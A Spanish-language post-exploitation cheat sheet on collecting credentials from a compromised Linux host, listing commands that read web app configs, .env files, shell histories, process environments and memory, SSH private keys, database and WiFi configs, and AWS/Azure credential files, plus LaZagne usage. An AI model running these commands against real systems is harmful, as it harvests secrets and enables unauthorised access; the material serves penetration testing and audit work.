# Búsqueda de Credenciales en Linux

Los sistemas Linux acumulan credenciales en ficheros de configuración de servicios, scripts de automatización, historiales de shell, variables de entorno y bases de datos de aplicaciones. Una revisión sistemática tras comprometer un host con privilegios bajos frecuentemente eleva el acceso sin necesidad de exploits.

### Archivos de configuración de servicios

Los daemons que se conectan a bases de datos, APIs o servicios externos necesitan almacenar sus credenciales en algún lugar:

```bash
# Bases de datos en configuraciones web
grep -r "password\|passwd\|db_pass\|DB_PASS\|secret\|token" \
  /var/www/ /srv/ /opt/ /etc/ 2>/dev/null \
  --include="*.conf" --include="*.php" --include="*.py" \
  --include="*.rb" --include="*.env" --include="*.yaml" --include="*.yml" -l

# Ver los archivos encontrados
cat /var/www/html/config.php
cat /var/www/html/.env
```

#### Ubicaciones habituales de credenciales en aplicaciones web

| Aplicación  | Archivo típico                             |
| ----------- | ------------------------------------------ |
| WordPress   | `/var/www/html/wp-config.php`              |
| Joomla      | `/var/www/html/configuration.php`          |
| Drupal      | `/var/www/html/sites/default/settings.php` |
| Laravel     | `/var/www/html/.env`                       |
| Django      | `settings.py` (buscar `DATABASES`)         |
| Generic PHP | `config.php`, `database.php`, `db.php`     |

### Historial de shell

Los historiales de Bash, Zsh y otros shells guardan comandos ejecutados, que frecuentemente incluyen contraseñas pasadas como argumentos:

```bash
cat ~/.bash_history
cat ~/.zsh_history
cat ~/.sh_history

# Buscar en todos los historiales del sistema
find /home /root -name ".*_history" 2>/dev/null -exec cat {} \;

# Buscar términos específicos en historial
grep -i "pass\|secret\|token\|key\|ssh\|mysql\|psql\|curl\|wget" ~/.bash_history
```

> 💡 Los comandos `mysql -u root -pPassword123` o `curl -u admin:secret https://api/` en el historial revelan credenciales directamente.

### Archivos .env y variables de entorno

```bash
# Buscar archivos .env
find / -name ".env" -readable 2>/dev/null
find / -name "*.env" -readable 2>/dev/null

# Variables de entorno del proceso actual
env | grep -i "pass\|secret\|token\|key\|api"

# Variables de entorno de procesos en ejecución
for pid in /proc/*/environ; do
  cat "$pid" 2>/dev/null | tr '\0' '\n' | grep -i "pass\|secret\|token"
done
```

### Claves SSH privadas

```bash
# Buscar claves privadas SSH
find / -name "id_rsa" -o -name "id_ed25519" -o -name "id_ecdsa" 2>/dev/null
find / -name "*.pem" -o -name "*.key" 2>/dev/null | xargs grep -l "PRIVATE KEY" 2>/dev/null

# Revisar authorized_keys para mapear accesos
find /home /root -name "authorized_keys" 2>/dev/null -exec cat {} \;
```

Si una clave privada no tiene passphrase, da acceso directo sin necesidad de cracking. Si está cifrada, procesar con `ssh2john` + `john`/`hashcat`.

### Credenciales en bases de datos locales

```bash
# MySQL — intentar acceso sin contraseña o con credenciales por defecto
mysql -u root -e "SELECT User,Password FROM mysql.user;" 2>/dev/null
mysql -u root -p''  2>/dev/null

# Buscar archivos de configuración de MySQL
cat /etc/mysql/debian.cnf          # contiene credenciales de mantenimiento
cat ~/.my.cnf                       # credenciales del usuario actual
find / -name "*.db" -o -name "*.sqlite" 2>/dev/null

# PostgreSQL
cat /etc/postgresql/*/main/pg_hba.conf
psql -U postgres -c "\du" 2>/dev/null
```

### Archivos de configuración del sistema

```bash
# Buscar contraseñas en /etc
grep -r "password\|passwd" /etc/ 2>/dev/null --include="*.conf" -l

# Configuraciones de red que pueden incluir credenciales
cat /etc/network/interfaces
cat /etc/NetworkManager/system-connections/*    # contiene PSK de WiFi en texto claro
cat /etc/fstab    # puede tener credenciales de mount CIFS/NFS

# Cron jobs — scripts que se ejecutan con credenciales hardcodeadas
cat /etc/crontab
ls /etc/cron.d/ /etc/cron.daily/ /etc/cron.weekly/
crontab -l    # cron del usuario actual
```

### Archivos de configuración de clientes

```bash
# Configuración SSH del usuario — puede revelar hosts, usuarios y claves
cat ~/.ssh/config

# Configuración de clientes de base de datos
cat ~/.pgpass           # credenciales PostgreSQL
cat ~/.my.cnf           # credenciales MySQL

# Configuración de herramientas de infraestructura
cat ~/.boto             # AWS credentials legacy
cat ~/.aws/credentials
cat ~/.azure/credentials
```

### Memoria de procesos

Con privilegios de root se puede volcar la memoria de procesos que manejan credenciales:

```bash
# Buscar strings de tipo contraseña en memoria de procesos
for pid in $(ps aux | grep -v grep | awk '{print $2}'); do
  strings /proc/$pid/mem 2>/dev/null | grep -i "password\|passwd" | head -5
done

# Con gdb — volcar memoria de un proceso específico
gdb -p <PID> --batch -ex "gcore /tmp/proc.dump"
strings /tmp/proc.dump | grep -i "password"
```

### Herramienta automatizada — LaZagne

```bash
python3 lazagne.py all
python3 lazagne.py browsers
python3 lazagne.py sysadmin
```

LaZagne cubre navegadores, clientes de correo, bases de datos, gestores de contraseñas y herramientas de desarrollo en Linux.

> Los archivos `.env` con credenciales de producción en servidores web son uno de los hallazgos más frecuentes y de mayor impacto en auditorías reales. Siempre revisar la raíz del documento web y directorios de aplicación.
